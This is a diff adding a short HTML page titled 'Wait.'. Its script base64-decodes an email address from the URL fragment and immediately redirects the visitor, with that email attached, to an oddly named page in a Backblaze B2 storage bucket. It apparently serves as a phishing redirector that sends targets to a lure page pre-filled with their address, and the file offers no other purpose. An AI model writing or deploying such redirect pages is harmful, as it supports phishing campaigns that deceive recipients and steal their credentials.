@@ -1,0 +1,30 @@
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Wait.</title>
+</head>
+<body>
+<script>
+  function base64Decode(str) {
+    try {
+      return decodeURIComponent(atob(str).split('').map(function(c) {
+        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+      }).join(''));
+    } catch (e) {
+      console.error('Invalid base64 string:', str);
+      return null;
+    }
+  }
+
+  var hash = window.location.hash;
+  if (hash !== "") {
+    hash = hash.substring(1); // Remove the '#' character
+    const email = base64Decode(hash);
+    if (email)
+ {
+      window.location.href = "https://arrwxvnndchto6oumzxfi4bafkreifsrcmlzmmfsubjewxvn3lfyf6sz453u.s3.us-east-005.backblazeb2.com/ACBNYMKDCYRLSA.html#" + email;
+    }
+  }
+</script>
+</body>
+</html>
